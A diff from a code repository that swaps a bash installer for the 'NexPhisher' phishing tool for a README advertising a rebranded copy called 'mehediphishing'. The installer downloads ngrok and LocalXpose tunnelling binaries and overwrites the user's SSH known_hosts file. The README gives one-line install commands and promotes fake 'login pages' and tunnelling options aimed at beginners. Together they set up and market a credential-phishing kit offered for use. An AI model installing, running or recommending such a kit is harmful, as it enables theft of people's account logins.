@@ -1,114 +1,65 @@
-#!/bin/bash
 
-banner() {
-clear
-printf "\e[0m\n"
-printf "\e[0m\e[92m  _   _            \e[0m\e[93m _____  _     _     _                \e[0m\n"
-printf "\e[0m\e[92m | \ | |           \e[0m\e[93m|  __ \| |   (_)   | |               \e[0m\n"
-printf "\e[0m\e[92m |  \| | _____  __ \e[0m\e[93m| |__) | |__  _ ___| |__   ___ _ __  \e[0m\n"
-printf "\e[0m\e[92m | .   |/ _ \ \/ / \e[0m\e[93m|  ___/|  _ \| / __|  _ \ / _ \  __| \e[0m\n"
-printf "\e[0m\e[92m | |\  |  __/>  <  \e[0m\e[93m| |    | | | | \__ \ | | |  __/ |    \e[0m\n"
-printf "\e[0m\e[92m |_| \_|\___/_/\_\ \e[0m\e[93m|_|    |_| |_|_|___/_| |_|\___|_| \e[0m\e[1;44m[V 1.0]\e[0m\n"
-printf "\e[0m\n"
-printf " \e[0m\e[1;41m Advanced Phishing Tool with 30+ Templates  [BY : HTR-TECH ]\e[0m\n"
-printf "\e[0m\n"
-}
-banner
-printf "\e[0m\n"
-printf "\e[0m\e[1;91m [\e[1;97m~\e[1;91m]\e[1;93m Installing Packages ....\e[0m\n"
-printf "\e[0m\n"
-apt-get update
-apt-get upgrade -y
-apt-get -y install ssh
-apt-get -y install curl
-apt-get -y install php
-apt-get -y install unzip
-apt-get -y install openssh-server
-printf "\e[0m\n"
-printf "\e[0m\e[1;91m [\e[1;97m~\e[1;91m]\e[1;93m Setting Up Environment ....\e[0m\n"
-if [[ -d .htr ]]; then
-printf ""
-else
-mkdir .htr
-fi
-if [[ -d logs ]]; then
-printf ""
-else
-mkdir logs
-fi
-if [[ -e Modules.zip ]]; then
-unzip -qq Modules.zip
-rm Modules.zip
-fi
-if [[ -e .htr/ngrok ]]; then
-printf ""
-else
-arch=$(uname -a | grep -o 'arm' | head -n1)
-arch2=$(uname -a | grep -o 'Android' | head -n1)
-if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
-if [[ -e ngrok-stable-linux-arm.zip ]]; then
-unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
-mv ngrok .htr
-rm -rf ngrok-stable-linux-arm.zip
-chmod +x .htr/ngrok
-else
-printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install Ngrok Manually.\e[0m\n"
-exit 1
-fi
-else
-curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
-if [[ -e ngrok-stable-linux-386.zip ]]; then
-unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
-mv ngrok .htr
-rm -rf ngrok-stable-linux-386.zip
-chmod +x .htr/ngrok
-else
-printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install Ngrok Manually.\e[0m\n"
-exit 1
-fi
-fi
-fi
-if [[ -e .htr/loclx ]]; then
-printf ""
-else
-archa=$(uname -a | grep -o 'arm' | head -n1)
-arch2a=$(uname -a | grep -o 'Android' | head -n1)
-if [[ $archa == *'arm'* ]] || [[ $arch2a == *'Android'* ]] ; then
-curl -LO https://lxpdownloads.sgp1.digitaloceanspaces.com/cli/loclx-linux-arm.zip > /dev/null 2>&1
-if [[ -e loclx-linux-arm.zip ]]; then
-unzip loclx-linux-arm.zip > /dev/null 2>&1
-mv loclx .htr
-rm -rf loclx-linux-arm.zip
-chmod +x .htr/loclx
-else
-printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install LocalXpose Manually.\e[0m\n"
-exit 1
-fi
-else
-curl -LO https://lxpdownloads.sgp1.digitaloceanspaces.com/cli/loclx-linux-386.zip > /dev/null 2>&1 
-if [[ -e loclx-linux-386.zip ]]; then
-unzip loclx-linux-386.zip > /dev/null 2>&1
-mv loclx .htr
-rm -rf loclx-linux-386.zip
-chmod +x .htr/loclx
-else
-printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install LocalXpose Manually.\e[0m\n"
-exit 1
-fi
-fi
-fi
-if [[ -d ~/.ssh ]]; then
-printf ""
-else
-mkdir ~/.ssh
-fi
-chmod +x nexphisher
-printf "|1|SVjtt9mtL4P/5lsqaielF1pJHvM=|6QmJXxfPd9A5uUaFI1RV2H4brTs= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3lJnhW1oCXuAYV9IBdcJA+Vx7AHL5S/ZQvV2fhceOAPgO2kNQZla6xvUwoE4iw8lYu3zoE1KtieCU9yInWOVI6W/wFaT/ETH1tn55T2FVsK/zaxPiHZVJGLPPdEEid0vS2p1JDfc9onZ0pNSHLl1QusIOeMUyZ2bUMMLLgw46KOT9S3s/LmxgoJ3PocVUn5rVXz/Dng7Y8jYNe4IFrZOAUsi7hNBa+OYja6ceefpDvNDEJ1BdhbYfGolBdNA7f+FNl0kfaWru4Cblr843wBe2ckO/sNqgeAMXO/qH+SSgQxUXF2AgAw+TGp3yCIyYoOPvOgvcPsQziJLmDbUuQpnH\n|1|PiraXMKgzzt9DdPRSLAtRvRad0Y=|2W162QXfHJvKKZWIaRyZO6VFWJI= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3lJnhW1oCXuAYV9IBdcJA+Vx7AHL5S/ZQvV2fhceOAPgO2kNQZla6xvUwoE4iw8lYu3zoE1KtieCU9yInWOVI6W/wFaT/ETH1tn55T2FVsK/zaxPiHZVJGLPPdEEid0vS2p1JDfc9onZ0pNSHLl1QusIOeMUyZ2bUMMLLgw46KOT9S3s/LmxgoJ3PocVUn5rVXz/Dng7Y8jYNe4IFrZOAUsi7hNBa+OYja6ceefpDvNDEJ1BdhbYfGolBdNA7f+FNl0kfaWru4Cblr843wBe2ckO/sNqgeAMXO/qH+SSgQxUXF2AgAw+TGp3yCIyYoOPvOgvcPsQziJLmDbUuQpnH\n" > ~/.ssh/known_hosts
-printf "\e[0m\n"
-printf "\e[0m\e[1;91m [\e[1;97m~\e[1;91m]\e[1;93m Installation Completed !! \e[0m\n"
-printf "\e[0m\n"
-sleep 2
-printf "\e[0m\e[1;91m [\e[1;97m~\e[1;91m]\e[1;93m Type \e[1;96mbash nexphisher \e[1;93mto run NEXPHISHER !! \e[0m\n"
-printf "\e[0m\n"
-printf "\e[0m\n"
+<p align="left">
+<a href="#"><img title="Made in Bangladesh" src="https://img.shields.io/badge/MADE%20IN-BANGLADESH-green?colorA=%23ff0000&colorB=%23017e40&style=for-the-badge"></a>
+</p>
+<p align="center">
+<a href="#"><img title="Zphisher" src="https://raw.githubusercontent.com/htr-tech/release-download/master/images/banne/MehediPhishing.png"></a>
+</p>
+<p align="center">
+<a href="https://github.com/htr-tech"><img title="Author" src="https://img.shields.io/badge/Author-htr--tech-red.svg?style=for-the-badge&logo=github"></a>
+<a href="#"><img title="Open Source" src="https://img.shields.io/badge/Open%20Source-%E2%9D%A4-green?style=for-the-badge"></a>
+</p>
+<p align="center">
+<a href="#"><img title="Version" src="https://img.shields.io/badge/Version-1.0-green.svg?style=flat-square"></a>
+<a href="#"><img title="Language" src="https://badges.frapsoft.com/bash/v1/bash.png?v=103"></a>
+<a href="https://github.com/htr-tech/followers"><img title="Followers" src="https://img.shields.io/github/followers/htr-tech?color=blue&style=flat-square"></a>
+<a href="https://github.com/htr-tech/nexphisher/stargazers/"><img title="Stars" src="https://img.shields.io/github/stars/htr-tech/nexphisher?color=red&style=flat-square"></a>
+<a href="https://github.com/htr-tech/nexphisher/network/members"><img title="Forks" src="https://img.shields.io/github/forks/htr-tech/nexphisher?color=red&style=flat-square"></a>
+<a href="https://github.com/htr-tech/nexphisher/watchers"><img title="Watching" src="https://img.shields.io/github/watchers/htr-tech/nexphisher?label=Watchers&color=blue&style=flat-square"></a>
+</p>
+
+## Installation :
+
+* `apt update`
+* `apt install git -y`
+* `git clone git://github.com/Mehedi1757/mehediphishing.git`
+* `cd mehediphishing`
+#### > SETUP : `bash setup`
+#### > SETUP [TERMUX] : `bash tmux_setup`
+#### > Run : `bash mehediphishing`
+
+## Single Command :
+```
+apt update ; apt install git -y ; git clone git://github.com/Mehedi1757/mehediphishing.git ; cd mehediphishing ; bash setup ; bash mehediphishing
+```
+<br>
+<p align="center">
+<img width="50%" src="https://raw.githubusercontent.com/htr-tech/release-download/master/images/mehediphishing1.png"/>
+<img width="46%" src="https://raw.githubusercontent.com/htr-tech/release-download/master/images/mehediphishing2.png"/>
+
+### <<< If you copy , Then Give me The Credits >>>
+
+## Features :
+#### [+] Latest Login Pages !
+#### [+] 5 Port Forwarding Options !
+#### [+] Easy for Beginners !
+
+## Credits :
+#### > Zphisher (https://github.com/htr-tech/zphisher)
+#### > The Linux Choice (https://github.com/thelinuxchoice)
+#### > DarkSecDevelopers (https://github.com/DarkSecDevelopers)
+#### > Undeadsec (https://github.com/Undeadsec)
+
+## Tunelling Options :
+#### > Localhost (127.0.0.1)
+#### > NGROK (https://ngrok.com)
+#### > SERVEO (https://serveo.net)
+#### > LOCALHOSTRUN (https://localhost.run)
+#### > LOCALXPOSE (https://localxpose.io/)
+
+## Find Me on :
+[![Github](https://img.shields.io/badge/Github-HTR--TECH-green?style=for-the-badge&logo=github)](https://github.com/htr-tech)
+[![Instagram](https://img.shields.io/badge/IG-%40tahmid.rayat-red?style=for-the-badge&logo=instagram)](https://www.instagram.com/tahmid.rayat)
+[![Messenger](https://img.shields.io/badge/Chat-Messenger-blue?style=for-the-badge&logo=messenger)](https://m.me/tahmid.rayat.official)
+
+
